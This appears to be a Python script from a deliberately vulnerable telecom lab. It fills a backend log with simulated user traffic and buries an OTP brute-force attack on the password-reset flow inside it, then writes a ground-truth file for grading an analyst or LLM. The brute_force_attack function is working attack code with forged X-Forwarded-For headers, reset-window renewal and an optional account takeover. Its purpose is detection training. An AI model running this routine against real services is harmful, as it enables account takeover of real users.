#!/usr/bin/env python3
"""
VulnMNO traffic simulator — fills the backend container's access log with a
large, realistic mix of benign user activity, then buries an OTP brute-force
against the "Forgot password?" flow inside it. The point is to produce a big,
noisy log in which an analyst (or an LLM) must *find* the malicious cluster —
see src/docs/vulns/mobile/M3-Insecure-Authentication-Authorization.md.

What it drives (all real endpoints, so responses are genuine 2xx/4xx):
  - benign read sessions: login once, then many GETs across §9 journeys
  - benign OTP logins (customer +…02), refreshes, support tickets
  - benign password-reset flows: request -> confirm (mostly 204; some 401
    fat-finger). THIS is what stops the attack from being a trivial grep —
    /password-reset/confirm now appears in normal traffic too, so the tell is
    *rate / volume / concentration on one victim*, not mere presence.
  - the attack: one source IP fires request -> many confirm (distinct wrong
    6-digit codes -> 401) at high rate, optionally landing (--land) on the
    fixed code -> 204 -> login 200 (account takeover).

Per-user source IPs:
  Each session forges a distinct X-Forwarded-For; the attacker uses one fixed
  IP. The backend must run with `--proxy-headers --forwarded-allow-ips=*`
  (the shipped Dockerfile does) and you must hit :8000 DIRECTLY (the default
  base URL) so uvicorn logs the forged IP instead of Caddy's.

The OTP/msisdn values are in request bodies, which the access log does NOT
carry (by design — see the M3 write-up). Ground truth (attacker IP, victim,
time window, counts) is written to a JSON file so you can grade the LLM.

Capture the dataset AFTER a run:
    docker logs -t docker-backend-1 > traffic.log     # -t = timestamps (needed!)

Usage:
    python3 src/scripts/simulate_traffic.py                       # default mix
    python3 src/scripts/simulate_traffic.py --benign-sessions 120 --attack-attempts 800
    python3 src/scripts/simulate_traffic.py --land                # full takeover arc
    python3 src/scripts/simulate_traffic.py --base-url http://localhost:8000

Requires only Python 3 stdlib.
"""
from __future__ import annotations

import argparse
import json
import random
import threading
import time
import signal
import os
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

# Seeded accounts (all password "secret123"). +…02 is OTP-enrolled (fixed 123456).
DIRECT_USERS = ["+34600000001", "+34600000003"]
OTP_USER = "+34600000002"
PASSWORD = "secret123"
OTP_CODE = "123456"  # +…02's fixed OTP login code

# Mobile-app-style UA for benign clients; a scanner-ish one for the attacker.
# (uvicorn's default access log omits UA, so this is cosmetic for now — but it
# shows up if you ever capture Caddy's JSON log instead.)
UA_BENIGN = "VulnMNO/0.1 okhttp/4.12.0"
UA_ATTACK = "ffuf/2.1.0"

_stats_lock = threading.Lock()
_stats: dict[str, int] = {}

def handler(signum, frame):
    print("\n[!] Exiting ...")
    os._exit(0)

signal.signal(signal.SIGINT, handler)

def _bump(key: str, n: int = 1) -> None:
    with _stats_lock:
        _stats[key] = _stats.get(key, 0) + n


def http(method, base, path, token=None, body=None, xff=None, ua=UA_BENIGN, timeout=15):
    """One request. Returns the HTTP status (or None on transport error)."""
    url = base + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", ua)
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    if xff:
        # Forge the apparent client. uvicorn --forwarded-allow-ips=* trusts it.
        req.add_header("X-Forwarded-For", xff)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            _bump(f"{method} {path.split('?')[0]} {r.status}")
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        _bump(f"{method} {path.split('?')[0]} {e.code}")
        return e.code, e.read()
    except Exception:
        _bump("transport_error")
        return None, b""


def rand_ip(rng) -> str:
    """A documentation/TEST-NET-ish source IP so it's obviously synthetic."""
    block = rng.choice(["198.51.100", "203.0.113", "192.0.2"])
    return f"{block}.{rng.randint(1, 254)}"


def login(base, msisdn, xff, rng):
    """Return an access token, transparently clearing OTP for +…02."""
    status, raw = http("POST", base, "/api/auth/login", body={"msisdn": msisdn, "password": PASSWORD}, xff=xff)
    if status != 200:
        return None
    try:
        data = json.loads(raw)
    except Exception:
        return None
    if "accessToken" in data:
        return data["accessToken"]
    challenge = data.get("challengeToken")
    if not challenge:
        return None
    time.sleep(rng.uniform(0.3, 1.2))  # human pause to read the SMS
    status, raw = http("POST", base, "/api/auth/otp/verify",
                       body={"challengeToken": challenge, "code": OTP_CODE}, xff=xff)
    if status == 200:
        try:
            return json.loads(raw).get("accessToken")
        except Exception:
            return None
    return None


# ---- benign action catalogue (path, then how to call) -----------------------
READ_PATHS = [
    "/api/customers/me", "/api/customers/me/lines", "/api/customers/me/sim-profile",
    "/api/accounts/me/balance", "/api/accounts/me/transactions",
    "/api/accounts/me/invoices",
    "/api/plans/current", "/api/plans/available",
    "/api/shop/products", "/api/shop/products?featured=true",
    "/api/shop/purchases",
    "/api/usage/calls", "/api/usage/sms", "/api/usage/data", "/api/usage/roaming",
    "/api/usage/export",
    "/api/loyalty/account", "/api/loyalty/transactions",
    "/api/notifications",
    "/api/support/tickets",
]


def benign_read_session(base, rng, min_think, max_think):
    xff = rand_ip(rng)
    user = rng.choice(DIRECT_USERS)
    token = login(base, user, xff, rng)
    if not token:
        return
    n = rng.randint(4, 14)
    for _ in range(n):
        roll = rng.random()
        if roll < 0.75:
            http("GET", base, rng.choice(READ_PATHS), token=token, xff=xff)
        elif roll < 0.85:
            # apply a promo (read-ish, no mutation)
            http("POST", base, "/api/shop/promotions/apply", token=token, xff=xff,
                 body={"productId": "DATA-10GB-7D", "promoCode": rng.choice(["SUMMER20", "BOGUS10"])})
        elif roll < 0.93:
            # open an invoice the user owns (or 404 — realistic noise)
            http("GET", base, f"/api/accounts/me/invoices/INV-{rng.randint(20000, 20010)}", token=token, xff=xff)
        else:
            # raise a support ticket (low-weight mutation)
            http("POST", base, "/api/support/tickets", token=token, xff=xff,
                 body={"topic": rng.choice(["Billing", "Plan", "Technical", "Purchase", "Other"]),
                       "description": "Auto-generated benign ticket"})
        time.sleep(rng.uniform(min_think, max_think))


def benign_otp_session(base, rng, min_think, max_think):
    xff = rand_ip(rng)
    token = login(base, OTP_USER, xff, rng)
    if not token:
        return
    for _ in range(rng.randint(2, 6)):
        http("GET", base, rng.choice(READ_PATHS), token=token, xff=xff)
        time.sleep(rng.uniform(min_think, max_think))


def benign_failed_login(base, rng):
    """A user fat-fingers their password — a legitimate 401 on /login."""
    http("POST", base, "/api/auth/login", xff=rand_ip(rng),
         body={"msisdn": rng.choice(DIRECT_USERS), "password": "wrong" + str(rng.randint(0, 999))})


def benign_reset_flow(base, rng, reset_code):
    """A real user resets their own password. Mostly succeeds (204); sometimes
    fat-fingers the code once or twice (401) before getting it right. Success
    re-sets the SAME password so the dataset stays repeatable. This is the
    benign /password-reset/confirm traffic that defeats grep-the-endpoint."""
    xff = rand_ip(rng)
    user = rng.choice(DIRECT_USERS)
    http("POST", base, "/api/auth/password-reset/request", body={"msisdn": user}, xff=xff)
    time.sleep(rng.uniform(2.0, 6.0))  # waiting for the email/SMS
    # 0–2 honest mistakes, then the correct code.
    for _ in range(rng.randint(0, 2)):
        http("POST", base, "/api/auth/password-reset/confirm", xff=xff,
             body={"msisdn": user, "code": f"{rng.randint(0, 999999):06d}", "newPassword": PASSWORD})
        time.sleep(rng.uniform(1.0, 4.0))
    if rng.random() < 0.85:  # most users eventually succeed
        http("POST", base, "/api/auth/password-reset/confirm", xff=xff,
             body={"msisdn": user, "code": reset_code, "newPassword": PASSWORD})


def brute_force_attack(base, victim, attacker_ip, attempts, land, reset_code, rng, gt, attack_delay):
    """The needle: one source hammers /password-reset/confirm with distinct
    wrong codes, fast, optionally renewing the window, optionally landing."""
    start = datetime.now(timezone.utc)
    http("POST", base, "/api/auth/password-reset/request", body={"msisdn": victim},
         xff=attacker_ip, ua=UA_ATTACK)
    # distinct wrong codes (never the real one, so non-landing stays all-401)
    used = {reset_code}
    sent = 0
    while sent < attempts:
        code = f"{rng.randint(0, 999999):06d}"
        if code in used:
            continue
        used.add(code)
        http("POST", base, "/api/auth/password-reset/confirm", xff=attacker_ip, ua=UA_ATTACK,
             body={"msisdn": victim, "code": code, "newPassword": "Pwned123!"})
        sent += 1
        # renew the 15-min window every ~150 tries (the /request auto-renewal trick)
        if sent % 150 == 0:
            http("POST", base, "/api/auth/password-reset/request", body={"msisdn": victim},
                 xff=attacker_ip, ua=UA_ATTACK)
        time.sleep(attack_delay)
    landed = False
    if land:
        s, _ = http("POST", base, "/api/auth/password-reset/confirm", xff=attacker_ip, ua=UA_ATTACK,
                    body={"msisdn": victim, "code": reset_code, "newPassword": "Pwned123!"})
        landed = (s == 204)
        if landed:
            http("POST", base, "/api/auth/login", xff=attacker_ip, ua=UA_ATTACK,
                 body={"msisdn": victim, "password": "Pwned123!"})
    end = datetime.now(timezone.utc)
    gt.update({
        "attacker_ip": attacker_ip, "victim_msisdn": victim,
        "attack_type": "password_reset_otp_bruteforce",
        "confirm_attempts": sent, "landed": landed,
        "window_start_utc": start.isoformat(), "window_end_utc": end.isoformat(),
        "user_agent": UA_ATTACK,
        "needle": ("a burst of POST /api/auth/password-reset/confirm -> 401 from "
                   f"{attacker_ip} within the window above"
                   + (", terminating in one 204 then POST /api/auth/login -> 200" if landed else "")),
    })


def main() -> None:
    ap = argparse.ArgumentParser(description="VulnMNO benign-traffic + brute-force log generator")
    ap.add_argument("--base-url", default="http://localhost:8000",
                    help="hit :8000 DIRECTLY so forged X-Forwarded-For is logged (default)")
    ap.add_argument("--benign-sessions", type=int, default=60, help="benign read sessions")
    ap.add_argument("--benign-resets", type=int, default=12, help="legit password-reset flows (anti-grep noise)")
    ap.add_argument("--failed-logins", type=int, default=20, help="benign wrong-password 401s")
    ap.add_argument("--otp-sessions", type=int, default=10, help="benign OTP-login sessions (+…02)")
    ap.add_argument("--attack-attempts", type=int, default=400, help="brute-force confirm tries")
    ap.add_argument("--attack-delay", type=float, default=0.05, help="seconds between attack tries (low = bursty)")
    ap.add_argument("--victim", default="+34600000003", help="brute-force target msisdn")
    ap.add_argument("--reset-code", default="123456", help="backend's fixed reset code (lab default)")
    ap.add_argument("--land", action="store_true", help="land the takeover (mutates victim pw to Pwned123!)")
    ap.add_argument("--concurrency", type=int, default=10)
    ap.add_argument("--think-min", type=float, default=0.4)
    ap.add_argument("--think-max", type=float, default=3.5)
    ap.add_argument("--spread", type=float, default=20.0, help="seconds over which to stagger session starts")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--groundtruth", default="traffic-groundtruth.json")
    args = ap.parse_args()

    rng = random.Random(args.seed)
    base = args.base_url.rstrip("/")
    attacker_ip = rand_ip(rng)
    gt: dict = {}

    # Build the job list. Each job sleeps a random start offset (so everything
    # overlaps in time and interleaves in the log), then runs its sequence.
    jobs = []
    for _ in range(args.benign_sessions):
        jobs.append(lambda: benign_read_session(base, rng, args.think_min, args.think_max))
    for _ in range(args.otp_sessions):
        jobs.append(lambda: benign_otp_session(base, rng, args.think_min, args.think_max))
    for _ in range(args.failed_logins):
        jobs.append(lambda: benign_failed_login(base, rng))
    for _ in range(args.benign_resets):
        jobs.append(lambda: benign_reset_flow(base, rng, args.reset_code))
    # the attack starts partway through the run so it's embedded mid-stream
    attack_offset = rng.uniform(args.spread * 0.25, args.spread * 0.75)

    def run_with_offset(fn, max_offset):
        time.sleep(rng.uniform(0, max_offset))
        try:
            fn()
        except Exception:
            _bump("job_error")

    print(f"[*] base={base}  attacker_ip={attacker_ip}  victim={args.victim}  "
          f"land={args.land}  benign_sessions={args.benign_sessions}")
    print(f"[*] generating traffic (~{args.spread:.0f}s spread + attack of "
          f"{args.attack_attempts} tries @ {args.attack_delay}s)…")

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = [pool.submit(run_with_offset, j, args.spread) for j in jobs]
        # schedule the attack as its own offset job
        def attack_job():
            time.sleep(attack_offset)
            brute_force_attack(base, args.victim, attacker_ip, args.attack_attempts,
                               args.land, args.reset_code, rng, gt, args.attack_delay)
        futures.append(pool.submit(attack_job))
        for f in futures:
            f.result()
    elapsed = time.time() - t0

    gt["generated_by"] = "src/scripts/simulate_traffic.py"
    gt["run_seconds"] = round(elapsed, 1)
    with open(args.groundtruth, "w") as fh:
        json.dump(gt, fh, indent=2)

    total = sum(v for k, v in _stats.items() if k not in ("transport_error", "job_error"))
    print(f"\n[+] done in {elapsed:.1f}s — {total} requests sent")
    print("[+] top request lines (method path status -> count):")
    for k, v in sorted(_stats.items(), key=lambda kv: -kv[1])[:18]:
        print(f"      {v:5d}  {k}")
    print(f"\n[+] ground truth -> {args.groundtruth}")
    print(f"      attacker IP : {gt.get('attacker_ip')}")
    print(f"      victim      : {gt.get('victim_msisdn')}  (landed={gt.get('landed')})")
    print(f"      window      : {gt.get('window_start_utc')} .. {gt.get('window_end_utc')}")
    print("\n[+] capture the backend log (WITH timestamps) for the LLM:")
    print("      docker logs -t docker-backend-1 > traffic.log")
    if args.land:
        print(f"\n[!] --land changed {args.victim}'s password to 'Pwned123!'. Restore it with a")
        print(f"    reset back to '{PASSWORD}', or re-seed the DB, before reusing the lab.")


if __name__ == "__main__":
    main()
